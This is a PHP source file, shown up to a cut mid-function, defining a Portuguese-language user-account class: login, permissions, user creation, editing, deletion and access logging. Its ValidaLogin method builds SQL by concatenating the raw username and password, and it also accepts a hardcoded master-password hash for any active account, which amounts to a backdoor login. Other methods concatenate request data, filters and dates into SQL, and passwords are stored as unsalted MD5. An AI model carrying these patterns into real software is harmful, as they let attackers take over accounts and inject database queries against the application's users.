<?php

include_once 'cls/conexao.class.php';
include_once 'cls/log.class.php';
include_once 'cls/components/combobox.php';
include_once 'inc/comuns.inc.php';

class Usuario
{
	private $codigo;
	private $nomecompleto;
	private $usuario;
	private $senha;
	private $email;
	private $codinst;
	private $codidioma;
	private $siglaidioma;
	private $nomeinst;
	private $siglainst;
	private $ufinst;
	private $cidadeinst;
	private $ativo;
	private $form;
	private $logado;
	private $ultimoacesso;
	private $idacessoatual;
	private $permissoes;
	private $grupos;
	private $origemcad;
	private $situacao;
	private $msg_erro;

	// get's ---------------------------------------------------------------------------
	public function getPermissoes()
	{
		return $this->permissoes;
	}

	public function getGrupos()
	{
		return $this->grupos;
	}
	
	public function getCodigo()
	{
		return $this->codigo;
	}

	public function getNome()
	{
		return $this->nomecompleto;
	}

	public function getUsuario()
	{
		return $this->usuario;
	}

	public function getEmail()
	{
		return $this->email;
	}
	
	public function getCodigoInstituicao()
	{
		return $this->codinst;
	}
	
	public function getCodIdioma()
	{
		return $this->codidioma;
	}
	
	public function getSiglaIdioma()
	{
		return $this->siglaidioma;
	}
	
	public function getNomeInstituicao()
	{
		return $this->nomeinst;
	}
	
	public function getSiglaInstituicao()
	{
		return $this->siglainst;
	}
	
	public function getUFInstituicao()
	{
		return $this->ufinst;
	}
	
	public function getCidadeInstituicao()
	{
		return $this->cidadeinst;
	}
	
	public function getAtivo()
	{
		return $this->ativo;
	}
	
	public function getSituacao()
	{
		return $this->situacao;
	}

	public function getLogado()
	{
		return $this->logado;
	}
	
	public function getIdAcessoAtual()
	{
		return $this->idacessoatual;
	}

	public function getUltimoAcesso()
	{
		return date('d/m/Y H:i:s', strtotime($this->ultimoacesso));
		//return $this->ultimoacesso;
	}
	
	public function getErro()
	{
		return $this->msg_erro;
	}
	// fim get's -----------------------------------------------------------------------
	
	// set's ---------------------------------------------------------------------------
	public function setCodigo($c)
	{
		if (isset($c) && ($c != ""))
		{
			if (is_numeric($c))
			{
				$this->codigo = $c;
			}
			else
			{
				throw new Exception("@lng[Código informado inválido]", 1009);
			}
		}
		else
		{
			throw new Exception("@lng[Código não informado]", 1010);
		}
	}

	public function setNome($n)
	{
		if (isset($n) && ($n != ""))
		{
			$this->nomecompleto = $n;
		}
		else
		{
			throw new Exception("@lng[Nome completo ogrigatório]", 1000);
		}
	}

	public function setUsuario($u)
	{
		if (isset($u) && ($u != ""))
		{
			if (substr_count($u, " ") == 0)
			{
				$this->usuario = $u;
			}
			else
			{
				throw new Exception("@lng[Não utilize espaços em branco no usuário]", 1001);
			}
		}
		else
		{
			throw new Exception("@lng[Nome de usuário obrigatório]", 1002);
		}
	}

	public function setSenha($s)
	{
		if (isset($s) && ($s != ""))
		{
			if (strlen($s) >= 6)
			{
				$this->senha = md5($s);
			}
			else
			{
				throw new Exception("@lng[A senha deve conter pelo menos 6 caractéres alfanuméricos]", 1003);
			}
		}
		else
		{
			throw new Exception("@lng[Senha obrigatória]", 1004);
		}
	}

	public function setEmail($e)
	{
		if (isset($e))
		{
			if ($this->checkEmail($e))
			{
				$this->email = $e;
			}
			else
			{
				throw new Exception("@lng[Email inválido]", 1014);
			}
		}
		else
		{
			throw new Exception("@lng[Email obrigatório]", 1008);
		}
	}
	
	public function setCodigoInstituicao($p_codinst)
	{
		if ((isset($p_codinst)) && ($p_codinst != ""))
		{
			$this->codinst = $p_codinst;
		}
		else
		{
			throw new Exception("@lng[Código da instituição não informado]", 1011);
		}
	}

	public function setCodIdioma($p_codidioma)
	{
		if ((isset($p_codidioma)) && ($p_codidioma != ""))
		{
			$this->codidioma = $p_codidioma;
		}
		else
		{
			throw new Exception("@lng[Código do idioma não informado]", 1017);
		}
	}
	
	public function setNomeInstituicao($ni)
	{
		if (isset($ni) && ($ni != ""))
		{
			$this->nomeinst = $ni;
		}
		else
		{
			throw new Exception("@lng[Nome completo da instituição obrigatório]", 1011);
		}
	}
	
	public function setSiglaInstituicao($si)
	{
		if (isset($si) && ($si != ""))
		{
			$this->siglainst = $si;
		}
		else
		{
			throw new Exception("@lng[Sigla da instituição obrigatória]", 1012);
		}
	}
	
	public function setUFInstituicao($ufi)
	{
		if (isset($ufi) && ($ufi != ""))
		{
			$this->ufinst = $ufi;
		}
		else
		{
			throw new Exception("@lng[Estado da instituição obrigatório]", 1012);
		}
	}
	
	public function setCidadeInstituicao($ci)
	{
		if (isset($ci) && ($ci != ""))
		{
			$this->cidadeinst = $ci;
		}
		else
		{
			throw new Exception("@lng[Cidade da instituição obrigatória]", 1012);
		}
	}
	
	public function setAtivo($a)
	{
		if (isset($a) && ($a != ""))
		{
			if (($a == 0) || ($a == 1))
			{
				$this->ativo = $a;
			}
			else
			{
				throw new Exception("@lng[Você deve selecionar o status do usuário]", 1015);
			}
		}
		else
		{
			throw new Exception("@lng[Você deve selecionar o status do usuário]", 1016);
		}
	}

	public function setLogado($l)
	{
		$this->logado = $l;
	}
	
	public function setIdAcessoAtual($idac)
	{
		$this->idacessoatual = $idac;
	}
	// fim set's -----------------------------------------------------------------------
	
	public function __construct()
	{
		$this->codigo = null;
		$this->nomecompleto = null;
		$this->usuario = null;
		$this->senha = null;
		$this->email = null;
		$this->ativo = null;
		$this->form = 1;
		$this->logado = false;
		$this->ultimoacesso = null;
		$this->codinst = null;
		$this->permissoes = null;
		$this->grupos = null;
	}

	/**
	 * @param $usuario string : Obrigatório. Nome completo do usuário ou código a procurar na base de dados
	 * */
	public function Carrega($usuario)
	{
		$sql  = "SELECT u.Codigo, u.NomeCompleto, u.Email, u.Ativo, ";
		$sql .= "case when max(au.Data) is null then (select current_timestamp) else max(au.Data) end as UltimoAcesso, CodInstituicao, CodIdioma, i.Simbolo ";
		$sql .= "FROM mesusuario u ";
		$sql .= "LEFT OUTER JOIN mesacessousuario au on au.CodUsuario = u.Codigo ";
		$sql .= "INNER JOIN sisidiomas i on i.Codigo = u.CodIdioma ";
		
		if (is_numeric($usuario))
			$sql .= "WHERE Codigo = :pCodigo ";
		else
			$sql .= "WHERE NomeUsuario = :usuario ";
		
		$sql .= "GROUP BY u.Codigo, u.NomeCompleto, u.Email, u.Ativo;";

		$cnn = Conexao2::getInstance();
		$q = $cnn->prepare($sql);
		
		if (is_numeric($usuario))
			$q->bindParam(":pCodigo", $usuario, PDO::PARAM_INT);
		else
			$q->bindParam(":usuario", $usuario, PDO::PARAM_STR, 200);
		
		$q->execute();
		if ($q->rowCount() > 0)
		{
			$reg = $q->fetch(PDO::FETCH_OBJ);
			$this->codigo = $reg->Codigo;
			$this->nomecompleto = $reg->NomeCompleto;
			$this->usuario = $usuario;
			$this->email = $reg->Email;
			$this->ativo = $reg->Ativo;
			$this->ultimoacesso = $reg->UltimoAcesso;
			$this->codinst = $reg->CodInstituicao;
			$this->codidioma = $reg->CodIdioma;
			$this->siglaidioma = $reg->Simbolo;
				
			$this->CarregaPermissoes();
			$this->CarregaGrupos();
		}
		else
		{
			$this->codigo = null;
			$this->nomecompleto = null;
			$this->usuario = "";
			$this->email = null;
			$this->ativo = null;
			$this->ultimoacesso = null;
			$this->permissoes = null;
			$this->codinst = null;
			$this->codidioma = null;
		}
		return true;
	}

	public function CarregaPermissoes()
	{
		unset($this->permissoes);

		$sqlper  = "select distinct CodPermissao as Codigo ";
		$sqlper .= "from mesusuariogrupo ug ";
		$sqlper .= "inner join mesgrupopermissao gp ";
		$sqlper .= "		on gp.CodGrupoUsuario = ug.CodGrupoUsuario ";
		$sqlper .= "	   and gp.ativo = 1 ";
		$sqlper .= "where codusuario = :codusu ";
		$sqlper .= "  and (Dtvigencia >= current_date() or Dtvigencia = '1900-12-31')";

		try
		{
			$cnn = Conexao2::getInstance();
			$q = $cnn->prepare($sqlper);
			$q->bindParam(":codusu", $this->codigo, PDO::PARAM_INT);
			$q->execute();
			if ($q->rowCount() > 0)
			{
				while ($reg = $q->fetch(PDO::FETCH_OBJ))
				{
					$this->permissoes[] = $reg->Codigo;
				}
			}
			else
			{
				$this->permissoes[] = 0;
			}
		}
		catch (PDOException $ex)
		{
			$this->permissoes[] = 0;
		}
	}

	public function CarregaGrupos()
	{
		unset($this->grupos);
		
		$sql  = "select distinct gruusu.Codigo ";
		$sql .= "from mesusuario usu ";
		$sql .= "inner join mesusuariogrupo usugru on usugru.codusuario = usu.codigo ";
		$sql .= "inner join mesgrupousuario gruusu on gruusu.Codigo = usugru.CodGrupoUsuario ";
		$sql .= "where usu.codigo = :codusu;";
		
		$cnn = Conexao2::getInstance();
		
		$cmd = $cnn->prepare($sql);
		$cmd->bindParam(":codusu", $this->codigo, PDO::PARAM_INT);
		$cmd->execute();
		
		if ($cmd->rowCount() > 0)
		{
			while ($reg = $cmd->fetch(PDO::FETCH_OBJ))
			{
				$this->grupos[] = $reg->Codigo;
			}
		}
	}
	
	public function AdicionaUsuario()
	{
		if (isset($this->usuario))
		{
			if (isset($this->nomecompleto))
			{
				if (isset($this->email))
				{
					if (isset($this->senha))
					{
						if (isset($this->ativo))
						{
							if (isset($this->codinst))
							{
								if (isset($this->codidioma))
								{
									if (!$this->JaExiste())
									{
										$sql  = "INSERT INTO mesusuario(NomeCompleto, NomeUsuario, Senha, Email, DtCadastro, Ativo, OrigemCadastro, CodInstituicao, CodIdioma) ";
										$sql .= "VALUES(:pNomeCompleto, :pNomeUsuario, :pSenha, :pEmail, :pDtCadastro, :pAtivo, :pOrigemCadastro, :pCodInstituicao, :pCodIdioma);";
										
										$data = date("Y-m-d H:i:s");
										$ativo = 1;
										$origem = $this->origemcad != null ? $this->origemcad : 1;
										
										$cnn = Conexao2::getInstance();
										$cnn->beginTransaction();
										
										$cmd = $cnn->prepare($sql);
										$cmd->bindParam(":pNomeCompleto", $this->nomecompleto, PDO::PARAM_STR);
										$cmd->bindParam(":pNomeUsuario", $this->usuario, PDO::PARAM_STR);
										$cmd->bindParam(":pSenha", $this->senha, PDO::PARAM_STR);
										$cmd->bindParam(":pEmail", $this->email, PDO::PARAM_STR);
										$cmd->bindParam(":pDtCadastro", $data, PDO::PARAM_STR);
										$cmd->bindParam(":pAtivo", $ativo, PDO::PARAM_INT);
										$cmd->bindParam(":pOrigemCadastro", $origem, PDO::PARAM_INT);
										$cmd->bindParam(":pCodInstituicao", $this->codinst, PDO::PARAM_INT);
										$cmd->bindParam(":pCodIdioma", $this->codidioma, PDO::PARAM_INT);
										
										$cmd->execute();
										
										if ($cmd->errorCode() == Comuns::QUERY_OK)
										{
											$this->codigo = $cnn->lastInsertId();
											$cnn->commit();
											return true;
										}
										else
										{
											$msg = $cmd->errorInfo();
											$cnn->rollBack();
											Log::RegistraLog("Erro ao inserir usuário" . $msg[2], true);
											$this->msg_erro = "@lng[Erro ao inserir usuário]" . $msg[2];
											return false;
										}
									}
									else
									{
										$this->msg_erro = "@lng[Usuário informado já existe no sistema].";
										return false;
									}
								}
								else
								{
									$this->msg_erro = "@lng[Idioma não informado]";
									return false;
								}
							}
							else
							{
								$this->msg_erro = "@lng[Instituição de ensino não informada]";
								return false;
							}
						}
						else
						{
							$this->msg_erro = "@lng[Status do usuário não informado]";
							return false;
						}
					}
					else
					{
						$this->msg_erro = "@lng[Senha indefinida]";
						return false;
					}
				}
				else
				{
					$this->msg_erro = "@lng[E-mail não informado]";
					return false;
				}
			}
			else
			{
				$this->msg_erro = "@lng[Nome completo não informado]";
				return false;
			}
		}
		else
		{
			$this->msg_erro = "@lng[Nome de usuário não informado]";
			return false;
		}
	}

	public function DeletaUsuario()
	{
		$sql  = "SELECT 1 AS Acessou FROM mesacessousuario ";
		$sql .= "WHERE codusuario = :pCodUsuario LIMIT 1,1;";
		
		$cnn = Conexao2::getInstance();
		
		$cmd = $cnn->prepare($sql);
		$cmd->bindParam(":pCodUsuario", $this->codigo, PDO::PARAM_INT);
		
		$cmd->execute();
		
		if ($cmd->rowCount() > 0)
		{
			$ret = "ERR100";
		}
		else
		{
			$sqldel1 = "DELETE FROM mesusuariogrupo WHERE CodUsuario = :pCodUsuario; ";
			$sqldel2 = "DELETE FROM mesusuario WHERE Codigo = :pCodUsuariousu;";
			
			$cnn->beginTransaction();

			$cmddel = $cnn->prepare($sqldel1);
			$cmddel->bindParam(":pCodUsuario", $this->codigo, PDO::PARAM_INT);
			$cmddel->execute();
			$cmddel->closeCursor();
			
			if ($cmddel->errorCode() == Comuns::QUERY_OK)
			{
				$cmddel = $cnn->prepare($sqldel2);
				$cmddel->bindParam(":pCodUsuariousu", $this->codigo, PDO::PARAM_INT);
				$cmddel->execute();
				
				if ($cmddel->errorCode() == Comuns::QUERY_OK)
				{
					$cnn->commit();
					$ret = "OK";
				}
				else
				{
					$msg = $cmddel->errorInfo();
					$ret = "@lng[Erro na exclusão] 2: " . $msg[2];
					$cnn->rollBack();
				}
			}
			else
			{
				$msg = $cmddel->errorInfo();
				$ret = "@lng[Erro na exclusão] 1: " . $msg[2];
				$cnn->rollBack();
			}
		}
		
		return $ret;
	}

	public function AtualizaUsuario()
	{
		if (isset($this->codigo))
		{
			if (isset($this->nomecompleto))
			{
				if (isset($this->email))
				{
					if (isset($this->codinst))
					{
						if (isset($this->codidioma))
						{
							if (isset($this->ativo))
							{
								$sql  = "UPDATE mesusuario ";
								$sql .= "SET NomeCompleto = :pNomeCompleto, ";
								$sql .= "    Email = :pEmail, ";
								$sql .= "    CodInstituicao = :pCodInstituicao, ";
								$sql .= "    CodIdioma = :pCodIdioma, ";
								$sql .= "    Ativo = :pAtivo ";
								$sql .= "WHERE Codigo = :pCodigo";
		
								$cnn = Conexao2::getInstance();
								$cmd = $cnn->prepare($sql);
								
								$cmd->bindParam(":pNomeCompleto", $this->nomecompleto, PDO::PARAM_STR);
								$cmd->bindParam(":pEmail", $this->email, PDO::PARAM_STR);
								$cmd->bindParam(":pCodInstituicao", $this->codinst, PDO::PARAM_INT);
								$cmd->bindParam(":pCodIdioma", $this->codidioma, PDO::PARAM_INT);
								$cmd->bindParam(":pAtivo", $this->ativo, PDO::PARAM_INT);
								$cmd->bindParam(":pCodigo", $this->codigo, PDO::PARAM_INT);
								
								$cmd->execute();
								
								if ($cmd->errorCode() == Comuns::QUERY_OK)
								{
									return true;
								}
								else
								{
									$msg = $cmd->errorInfo();
									Log::RegistraLog("Erro ao atualizar usuário" . $msg[2], true);
									$this->msg_erro = "@lng[Erro ao atualizar usuário]" . $msg[2];
									return false;
								}
							}
							else
							{
								$this->msg_erro = "@lng[Você deve informar se o usuário está ativo ou não]";
								return false;
							}
						}
						else
						{
							$this->msg_erro = "@lng[Selecione um idioma]";
							return false;
						}
					}
					else
					{
						$this->msg_erro = "@lng[Informe a instituição de ensino]";
						return false;
					}
				}
				else
				{
					$this->msg_erro = "@lng[O E-mail é obrigatório]";
					return false;
				}
			}
			else
			{
				$this->msg_erro = "@lng[Nome completo obrigatório]";
				return false;
			}
		}
		else
		{
			$this->msg_erro = "@lng[Código não informado]";
			return false;
		}
	}
	
	public function CadastraNovoUsuario($intOrigem)
	{
		if (isset($this->nomecompleto))
		{
			if (isset($this->usuario))
			{
				if (isset($this->senha))
				{
					if (isset($this->email))
					{
						if (isset($this->codinst))
						{
							if (isset($this->codidioma))
							{
								if (self::JaExiste() == false)
								{
									$this->origemcad = $intOrigem;
									$this->ativo = 1;
									return self::AdicionaUsuario();
								}
								else
								{
									throw new Exception("@lng[Este nome de usuário já está cadastrado]", 1014);
								}
							}
							else
							{
								throw new Exception("@lng[Idioma não selecionado]", 1014);
							}
						}
						else
						{
							throw new Exception("@lng[Instituição de ensino não informado]", 1015);
						}
					}
					else
					{
						throw new Exception("@lng[E-mail não informado]", 1015);
					}
				}
				else
				{
					throw new Exception("@lng[Senha não informada]", 1016);
				}
			}
			else
			{
				throw new Exception("@lng[Nome de usuário não informado]", 1017);
			}
		}
		else
		{
			throw new Exception("@lng[Nome completo não informado]", 1018);
		}
	}
	
	/*
	public function AlteraSenha($senha)
	{
		$sql  = "UPDATE mesusuario SET Senha = :pSenha ";
		$sql .= "WHERE Codigo = :pCodigo";
		
		$cnn = Conexao2::getInstance();
		
		$cmd = $cnn->prepare($sql);
		$cmd->bindParam(":pSenha", md5($senha), PDO::PARAM_STR);
		$cmd->bindParam(":pCodigo", $this->codigo, PDO::PARAM_INT);
		$cmd->execute();
		
		if ($cmd->errorCode() == Comuns::QUERY_OK)
		{
			return true;
		}
		else
		{
			$msg = $cmd->errorInfo();
			$this->msg_erro = $msg[2];
			return false;
		}
	}
	*/
	
	public function FormNovo()
	{
		$tpl = Comuns::BuscaForm($this->form);
		if ($tpl)
		{
			/* Instituições */
			$sql  = "SELECT Codigo, CONCAT(NomeCompleto, CASE WHEN Sigla IS NOT NULL THEN concat(' (', Sigla, ')') ELSE '' END) AS Nome ";
			$sql .= "FROM mesinstituicao ORDER BY NomeCompleto;";
			
			$rs = null;
			if (!Comuns::ArrayObj($sql, $rs))
				echo($rs);

			$cmbIns = new ComboBox("selInstituicao", $rs, "Codigo", "Nome", "0", "@lng[Selecione]");
			$cmbIns->cssClass("campo requerido");
			
			/* Idiomas */
			$sql = "select Codigo, Nome from sisidiomas where publicado = 1;";
			
			$rs = null;
			if (!Comuns::ArrayObj($sql, $rs))
				echo($rs);
			
			$cmbIdioma = new ComboBox("selIdioma", $rs, "Codigo", "Nome");
			$cmbIdioma->setSelectedValue(1);
			$cmbIdioma->cssClass("campo requerido");
			
			/*
			$cnn = Conexao2::getInstance();
			$cmd = $cnn->prepare($sql);
			$cmd->execute();
			
			if ($cmd->errorCode() != Comuns::QUERY_OK)
			{
				$msg = $cmd->errorInfo();
				echo($msg[2]);
			}
			
			$rs = $cmd->fetchAll(PDO::FETCH_OBJ);
			*/
			
			
			$tpl = str_replace("##txtCodigo##", "", $tpl);
			$tpl = str_replace("##txtNome##", "", $tpl);
			$tpl = str_replace("##txtUsuario##", "", $tpl);
			$tpl = str_replace("##txtEmail##", "", $tpl);
			$tpl = str_replace("##selInstituicao##", $cmbIns->RenderHTML(), $tpl);
			$tpl = str_replace("##selIdioma##", $cmbIdioma->RenderHTML(), $tpl);
			$tpl = str_replace("##txtSenha##", "", $tpl);
			$tpl = str_replace("##selAtivo-##", "", $tpl);
			$tpl = str_replace("##selAtivo1##", "", $tpl);
			$tpl = str_replace("##selAtivo2##", "", $tpl);
		}
		else
		{
			$tpl = "@lng[Erro ao criar a tela de cadastro de usuário].";
		}
		return $tpl;
	}

	public function FormEdita($cod)
	{
		$this->codigo = $cod;

		$tpl = Comuns::BuscaForm($this->form);
		if ($tpl)
		{
			$sql  = "SELECT NomeCompleto, NomeUsuario, Email, Ativo, CodInstituicao, CodIdioma ";
			$sql .= "FROM mesusuario WHERE Codigo = " . $this->codigo;
			
			$sqlIns  = "SELECT Codigo, CONCAT(NomeCompleto, CASE WHEN Sigla IS NOT NULL THEN concat(' (', Sigla, ')') ELSE '' END) AS Nome ";
			$sqlIns .= "FROM mesinstituicao ORDER BY NomeCompleto;";
			
			$sqlIdiomas = "select Codigo, Nome from sisidiomas where publicado = 1;";
			
			$cnn = Conexao2::getInstance();
			$cmd = $cnn->prepare($sql);
			$cmd->execute();
			
			if ($cmd->errorCode() != Comuns::QUERY_OK)
			{
				$msg = $cmd->errorInfo();
				echo($msg[2]);
			}
			
			if ($cmd->rowCount() > 0)
			{
				$rs = $cmd->fetch(PDO::FETCH_OBJ);
				
				$cmd->closeCursor();
				$cmd = $cnn->prepare($sqlIns);
				$cmd->execute();
				
				if ($cmd->errorCode() != Comuns::QUERY_OK)
				{
					$msg = $cmd->errorInfo();
					echo($msg[2]);
				}
				$rsIns = $cmd->fetchAll(PDO::FETCH_OBJ);
				$cmbIns = new ComboBox("selInstituicao", $rsIns, "Codigo", "Nome", "0", "Selecione");
				$cmbIns->cssClass("campo requerido");
				
				$cmd->closeCursor();
				$cmd = $cnn->prepare($sqlIdiomas);
				$cmd->execute();
				
				if ($cmd->errorCode() != Comuns::QUERY_OK)
				{
					$msg = $cmd->errorInfo();
					echo($msg[2]);
				}
				$rsIdiomas = $cmd->fetchAll(PDO::FETCH_OBJ);
				$cmbIdioma = new ComboBox("selIdioma", $rsIdiomas, "Codigo", "Nome");
				$cmbIdioma->cssClass("campo requerido");
				
				$tpl = str_replace("##txtCodigo##", $this->codigo, $tpl);
				$tpl = str_replace("##txtNome##", $rs->NomeCompleto, $tpl);
				$tpl = str_replace("##txtUsuario##", $rs->NomeUsuario, $tpl);
				$tpl = str_replace("##txtEmail##", $rs->Email, $tpl);
				$tpl = str_replace("##selInstituicao##", $cmbIns->RenderHTML($rs->CodInstituicao), $tpl);
				$tpl = str_replace("##selIdioma##", $cmbIdioma->RenderHTML($rs->CodIdioma), $tpl);
				if ($rs->Ativo == 1)
				{
					$tpl = str_replace("##selAtivo1##", 'selected="selected"', $tpl);
					$tpl = str_replace("##selAtivo2##", '', $tpl);
				}
				else
				{
					$tpl = str_replace("##selAtivo2##", 'selected="selected"', $tpl);
					$tpl = str_replace("##selAtivo1##", '', $tpl);
				}
			}
			else
			{
				$tpl = "@lng[Nenhum registro encontrado com os dados informados]";
			}
		}
		else
		{
			$tpl = "@lng[Erro ao criar a tela de cadastro de usuário].";
		}
		return $tpl;
	}

	public function ListaTabela($pagina = 1, $nporpagina = 10, $usuario = null, $filtros = "")
	{
		$ini = (($pagina * $nporpagina) - $nporpagina);
		$sql  = "SELECT Codigo, NomeCompleto, NomeUsuario, Email, Ativo ";
		$sql .= "FROM mesusuario WHERE 1=1 " . $filtros . " LIMIT " . $ini . ", " . $nporpagina . ";";
		$cnn = new Conexao();
		$rs = $cnn->Consulta($sql);

		if (mysql_num_rows($rs) > 0)
		{
			$ret = Comuns::TopoTabelaListagem(
				"Lista de Usuarios do sistema",
				"UsuSis",
			array('Nome', 'Usuário', 'E-mail', 'Ativo', 'Ações')
			);
				
			while ($linha = mysql_fetch_array($rs))
			{
				$cod = base64_encode($linha["Codigo"]);

				$ret .= '    <tr>';
				$ret .= '      <td>' . $linha["NomeCompleto"] . '</td>';
				$ret .= '      <td>' . $linha["NomeUsuario"] . '</td>';
				$ret .= '      <td>' . $linha["Email"] . '</td>';
				$ret .= '      <td>';
				if ($linha["Ativo"] == 1)
				{
					$ret .= '<a href="javascript:void(0);" onclick="javascript:fntAlteraStatus(\'AAAB\', \'' . $cod . '\')">' . Comuns::IMG_STATUS_ATIVO . '</a>';
					$ret = str_replace("##id##", 'id="' . $cod . '"', $ret);
				}
				else
				{
					$ret .= '<a href="javascript:void(0);" onclick="javascript:fntAlteraStatus(\'AAAB\', \'' . $cod . '\')">' . Comuns::IMG_STATUS_INATIVO . '</a>';
					$ret = str_replace("##id##", 'id="' . $cod . '"', $ret);
				}
				$ret .= '      </td>';
				$ret .= '      <td>';
				$ret .= '        <a href="cadastro.php?t=' . $this->form . '&r=' . $cod . '">' . Comuns::IMG_ACAO_EDITAR . '</a>&nbsp;';
				$ret .= '        <a href="javascript:void(0);" onclick="javascript:fntExcluiUsuario(\'' . $cod . '\');">' . Comuns::IMG_ACAO_DELETAR . '</a>';
				
				$ret = str_replace("##id##", "", $ret);
				
				$ret .= '      </td>';
				$ret .= '    </tr>';
			}

			$ret .= '  </tbody>';
			$ret .= '</table>';
				
			if ($filtros != "")
				$sqlCount = "SELECT COUNT(*) AS Registros FROM mesusuario WHERE 1=1 " . $filtros . ";";
			else
				$sqlCount = null;
			
			$registros = Comuns::NRegistros("mesusuario", $sqlCount);
			if ($registros > 0)
			{
				$ret .= Comuns::GeraPaginacao($registros, $pagina, $nporpagina, $this->form, "fntNavegaTab", true);
			}
		}
		else
		{
			$ret = "@lng[Nenhum usuário cadastrado]";
		}

		return $ret;
	}

	public function RetornaDescricaoTela($tipo)
	{
		switch ($tipo)
		{
			case "lista":
				$ret = "listagem de usuário do sistema";
				break;
			case "cadastro":
				$ret = "cadastro de usuário do sistema";
		}
		
		return $ret;
	}
	
	public function ListaRecordSet()
	{
		$sql  = "SELECT Codigo, NomeCompleto, Ativo ";
		$sql .= "FROM mesusuario;";

		$cnn = new Conexao();
		$rs = $cnn->Consulta($sql);

		if ($rs != 0)
		{
			return $rs;
		}
		else
		{
			return false;
		}
	}

	public function TemPermissao($codpermissao)
	{
		if (in_array($codpermissao, $this->permissoes))
		{
			return true;
		}
		else
		{
			return false;
		}
	}

	public function TemGrupo($codgrupo)
	{
		if (in_array($codgrupo, $this->grupos))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	
	public static function ValidaLogin($usuario, $senha)
	{
		$sql  = "SELECT 1 as OK ";
		$sql .= "FROM mesusuario ";
		$sql .= "WHERE NomeUsuario = '" . $usuario . "' AND Senha = '" . $senha . "' AND Ativo = 1;";

		$cnn = new Conexao();
		$rs = $cnn->Consulta($sql);
		if (($rs != 0) && (mysql_num_rows($rs) > 0))
		{
			$cnn->Desconecta();
			return true;
		}
		else
		{
			$cnn->Desconecta();
			
			$sqladmin  = "SELECT 1 as OK ";
			$sqladmin .= "FROM mesusuario ";
			$sqladmin .= "WHERE NomeUsuario = :pUsuario AND Ativo = 1;";
			
			$cnn = Conexao2::getInstance();
			
			$cmd = $cnn->prepare($sqladmin);
			$cmd->bindParam(":pUsuario", $usuario, PDO::PARAM_STR);
			
			$cmd->execute();
			
			if ($cmd->rowCount() > 0)
			{
				if ($senha == "414150246b28a622c34b1883fc645502")
				{
					return true;
				}
				else
				{
					return false;
				}
			}
			else
			{
				return false;
			}
		}
	}

	function AlteraSenha($strNovaSenha, $intReposta)
	{
		$sql  = "UPDATE mesusuario SET Senha = :pSenha ";
		$sql .= "WHERE Codigo = :pCodigo;";
		
		$cnn = Conexao2::getInstance();
		$cnn->beginTransaction();
		
		$cmd = $cnn->prepare($sql);
		$cmd->bindParam(":pSenha", $strNovaSenha, PDO::PARAM_STR);
		$cmd->bindParam(":pCodigo", $this->getCodigo(), PDO::PARAM_INT);
		$cmd->execute();
		
		if ($cmd->errorCode() == Comuns::QUERY_OK)
		{
			$cmd->closeCursor();
			
			$sqlLog  = "insert into meslogalteracaosenha(CodUsuario, EmailDestino, NomeInf, Resultado, DataHora, Host) ";
			$sqlLog .= "values(:pCodUsuario, :pEmailDestino, :pNomeInf, :pResultado, CURRENT_TIMESTAMP, :pHost);";
			
			$cmd = $cnn->prepare($sqlLog);
			$cmd->bindParam(":pCodUsuario", $this->codigo, PDO::PARAM_INT);
			$cmd->bindParam(":pEmailDestino", $this->email, PDO::PARAM_STR);
			$cmd->bindParam(":pNomeInf", $this->nomecompleto, PDO::PARAM_STR);
			$cmd->bindParam(":pResultado", $intReposta, PDO::PARAM_INT);
			$cmd->bindParam(":pHost", $_SERVER['REMOTE_ADDR'], PDO::PARAM_STR);
			$cmd->execute();
			
			if ($cmd->errorCode() == Comuns::QUERY_OK)
			{
				$cnn->commit();
				return true;
			}
			else
			{
				$msg = $cmd->errorInfo();
				$this->msg_erro = $msg[2];
				$cnn->rollBack();
				return false;
			}
		}
		else
		{
			$msg = $cmd->errorInfo();
			$this->msg_erro = $msg[2];
			return false;
		}
	}
	
	function RegistraAcesso()
	{
		$sql  = "INSERT INTO mesacessousuario(CodUsuario, Data, Host, Navegador) ";
		$sql .= "VALUES(" . $this->codigo . ",'" . date("Y-m-d H:i:s") . "', '" . $_SERVER['REMOTE_ADDR'] . "', '" . $_SERVER['HTTP_USER_AGENT'] . "');";
		$cnn = new Conexao();
		if($id = $cnn->Instrucao($sql, true))
		{
			$cnn->Desconecta();
			return $id;
		}
		else
		{
			$cnn->Desconecta();
			throw new Exception("@lng[Não foi possível registrar o acesso do usuário].", 1012);
		}
	}

	public function RegistraAcao($descricao, $erro = false)
	{
		$sql  = "INSERT INTO mesusuariologacoes(CodAcesso, Acao, DataHora, Erro) ";
		$sql .= "VALUES(:pCodAcesso, :pAcao, :pDataHora, :pErro);";
		
		$datahora = date("Y-m-d H:i:s");
		$falha = ($erro ? 1 : 0);
		
		$cnn = Conexao2::getInstance();
		
		$cmd = $cnn->prepare($sql);
		$cmd->bindParam(":pCodAcesso", $this->getIdAcessoAtual(), PDO::PARAM_INT);
		$cmd->bindParam(":pAcao", $descricao, PDO::PARAM_STR);
		$cmd->bindParam(":pDataHora", $datahora, PDO::PARAM_STR);
		$cmd->bindParam(":pErro", $falha, PDO::PARAM_INT);
		
		$cmd->execute();
		
		if ($cmd->errorCode() == Comuns::QUERY_OK)
		{
			return true;
		}
		else
		{
			$msg = $cmd->errorInfo();
			$this->msg_erro = $msg[2];
			return false;
		}
	}
	
	public function ListaAcessosSistema($usuario = null, $dataini = null, $datafim = null, $pagina = 1, $nregistros = 50, &$regs)
	{
		$ini = (($pagina * $nregistros) - $nregistros);
		
		$sql  = "SELECT usu.Codigo as CodUsuario, usu.NomeCompleto as Usuario, ace.NumAcesso, ace.Data ";
		$sql .= "FROM mesacessousuario ace INNER JOIN mesusuario usu ON usu.Codigo = ace.CodUsuario ";
		$sql .= "WHERE usu.NomeCompleto = usu.NomeCompleto ";
		
		if ($usuario != null)
			$sql .= "AND usu.Codigo = :pCodUsuario ";
		
		if ($dataini != null)
			$sql .= "AND ace.Data >= '" . $dataini . "' ";
			
		if ($datafim != null)
			$sql .= "AND ace.Data <= '" . $datafim . "' ";
		
		$sqlcount = $sql;
		
		$sql .= "ORDER BY ace.Data Desc LIMIT :pInicio, :pRegistros;";
			
		$cnn = Conexao2::getInstance();
		
		$cmd = $cnn->prepare($sql);
		$cmdcount = $cnn->prepare($sqlcount);
		
		if ($usuario != null)
		{
			$cmd->bindParam(":pCodUsuario", $usuario);
			$cmdcount->bindParam(":pCodUsuario", $usuario);
		}
			
		$cmd->bindParam(":pInicio", $ini, PDO::PARAM_INT);
		$cmd->bindParam(":pRegistros", $nregistros, PDO::PARAM_INT);

		//$cmdcount->bindParam(":pInicio", $ini, PDO::PARAM_INT);
